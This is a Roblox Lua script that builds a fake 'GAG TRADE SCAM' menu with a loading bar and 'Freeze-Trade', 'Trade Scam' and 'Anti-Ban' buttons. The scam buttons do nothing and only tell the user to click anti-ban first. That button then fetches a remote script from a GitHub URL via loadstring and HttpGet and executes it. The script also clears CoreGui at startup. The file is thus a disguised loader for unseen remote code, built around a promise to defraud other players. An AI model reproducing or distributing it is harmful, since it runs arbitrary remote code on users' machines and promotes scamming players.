-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- Clear CoreGui (optional)
pcall(function()
    game:GetService("CoreGui"):ClearAllChildren()
end)

-- Loading Screen Setup
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingScreen"
loadingGui.Parent = player:WaitForChild("PlayerGui")

local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(0, 300, 0, 50)
loadingFrame.Position = UDim2.new(0.5, -150, 0.5, -25)
loadingFrame.BackgroundColor3 = Color3.new(0, 0, 0) -- Black background
loadingFrame.BorderSizePixel = 2
loadingFrame.BorderColor3 = Color3.fromRGB(0, 255, 0)
loadingFrame.Parent = loadingGui
Instance.new("UICorner", loadingFrame).CornerRadius = UDim.new(0, 10)

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 0, 25)
loadingText.Position = UDim2.new(0, 0, 0, 0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "loading ur script 🐶"
loadingText.TextColor3 = Color3.fromRGB(0, 255, 0)
loadingText.Font = Enum.Font.SourceSansBold
loadingText.TextSize = 18
loadingText.Parent = loadingFrame

local loadingBarBackground = Instance.new("Frame")
loadingBarBackground.Size = UDim2.new(1, -20, 0, 15)
loadingBarBackground.Position = UDim2.new(0, 10, 0, 30)
loadingBarBackground.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
loadingBarBackground.BorderSizePixel = 0
loadingBarBackground.Parent = loadingFrame
Instance.new("UICorner", loadingBarBackground).CornerRadius = UDim.new(0, 7)

local loadingBarFill = Instance.new("Frame")
loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
loadingBarFill.Position = UDim2.new(0, 0, 0, 0)
loadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
loadingBarFill.BorderSizePixel = 0
loadingBarFill.Parent = loadingBarBackground
Instance.new("UICorner", loadingBarFill).CornerRadius = UDim.new(0, 7)

-- Tween the loading bar fill from 0 to full over 15 seconds
local tweenInfo = TweenInfo.new(15, Enum.EasingStyle.Linear)
local tween = TweenService:Create(loadingBarFill, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
tween:Play()

tween.Completed:Connect(function()
    -- Remove loading screen
    loadingGui:Destroy()

    -- Main GUI Setup
    local gui = Instance.new("ScreenGui")
    gui.Name = "GagTradeScamMockup"
    gui.ResetOnSpawn = false
    gui.Parent = player:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 250)
    frame.Position = UDim2.new(0.5, -150, 0.5, -125)
    frame.BackgroundColor3 = Color3.new(0, 0, 0) -- Black background ONLY here
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(200, 200, 200)
    frame.Active = true
    frame.Draggable = true
    frame.Parent = gui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.BackgroundTransparency = 1
    title.Text = "GAG TRADE SCAM 🦊"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 20
    title.Parent = frame

    -- Freeze-Trade Button
    local freezeBtn = Instance.new("TextButton")
    freezeBtn.Size = UDim2.new(1, -20, 0, 30)
    freezeBtn.Position = UDim2.new(0, 10, 0, 40)
    freezeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 100)
    freezeBtn.Text = "🧊 Freeze-Trade 🧊"
    freezeBtn.TextColor3 = Color3.new(1, 1, 1)
    freezeBtn.Font = Enum.Font.SourceSansBold
    freezeBtn.TextSize = 16
    freezeBtn.Parent = frame
    Instance.new("UICorner", freezeBtn).CornerRadius = UDim.new(0, 6)

    -- Trade Scam Button
    local scamBtn = Instance.new("TextButton")
    scamBtn.Size = UDim2.new(1, -20, 0, 30)
    scamBtn.Position = UDim2.new(0, 10, 0, 85)
    scamBtn.BackgroundColor3 = Color3.fromRGB(50, 80, 50)
    scamBtn.Text = "✅ Trade Scam ✅"
    scamBtn.TextColor3 = Color3.fromRGB(150, 255, 150)
    scamBtn.Font = Enum.Font.SourceSansBold
    scamBtn.TextSize = 16
    scamBtn.Parent = frame
    Instance.new("UICorner", scamBtn).CornerRadius = UDim.new(0, 6)

    -- Anti-Ban Button
    local antiban = Instance.new("TextButton")
    antiban.Size = UDim2.new(1, -20, 0, 30)
    antiban.Position = UDim2.new(0, 10, 0, 130)
    antiban.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
    antiban.BorderSizePixel = 1
    antiban.BorderColor3 = Color3.new(1, 0, 0)
    antiban.Text = "🚫 Anti-Ban 🚫"
    antiban.TextColor3 = Color3.fromRGB(255, 80, 80)
    antiban.Font = Enum.Font.SourceSansBold
    antiban.TextSize = 16
    antiban.Parent = frame
    Instance.new("UICorner", antiban).CornerRadius = UDim.new(0, 6)

    -- Footer
    local footer = Instance.new("TextLabel")
    footer.Size = UDim2.new(1, 0, 0, 30)
    footer.Position = UDim2.new(0, 0, 0, 190)
    footer.BackgroundTransparency = 1
    footer.Text = "Made by W.1ts"
    footer.TextColor3 = Color3.new(1, 1, 1)
    footer.Font = Enum.Font.SourceSansBold
    footer.TextSize = 14
    footer.Parent = frame

    -- Info Label for Freeze and Scam buttons
    local infoLabel = Instance.new("TextLabel")
    infoLabel.Size = UDim2.new(1, -20, 0, 25)
    infoLabel.Position = UDim2.new(0, 10, 0, 220)
    infoLabel.BackgroundTransparency = 1
    infoLabel.Text = ""
    infoLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    infoLabel.Font = Enum.Font.SourceSansBold
    infoLabel.TextSize = 14
    infoLabel.TextWrapped = true
    infoLabel.Parent = frame

    -- Freeze Button click
    freezeBtn.MouseButton1Click:Connect(function()
        infoLabel.Text = "click anti ban first"
        infoLabel.TextTransparency = 1
        infoLabel.Visible = true

        -- Fade in
        for i = 1, 0, -0.05 do
            infoLabel.TextTransparency = i
            wait(0.03)
        end

        wait(10) -- visible for 10 seconds

        -- Fade out
        for i = 0, 1, 0.05 do
            infoLabel.TextTransparency = i
            wait(0.03)
        end

        infoLabel.Visible = false
    end)

    -- Scam Button click
    scamBtn.MouseButton1Click:Connect(function()
        infoLabel.Text = "click anti ban first"
        infoLabel.TextTransparency = 1
        infoLabel.Visible = true

        -- Fade in
        for i = 1, 0, -0.05 do
            infoLabel.TextTransparency = i
            wait(0.03)
        end

        wait(10) -- visible for 10 seconds

        -- Fade out
        for i = 0, 1, 0.05 do
            infoLabel.TextTransparency = i
            wait(0.03)
        end

        infoLabel.Visible = false
    end)

    -- Anti-Ban Button - Fake loading screen
    antiban.MouseButton1Click:Connect(function()
        gui:Destroy()
        local loading = loadstring(game:HttpGet("https://raw.githubusercontent.com/spawnerscript/loadingscreen/refs/heads/main/plsnoskid.lua"))()
        spawn(loading)
    end)
end)
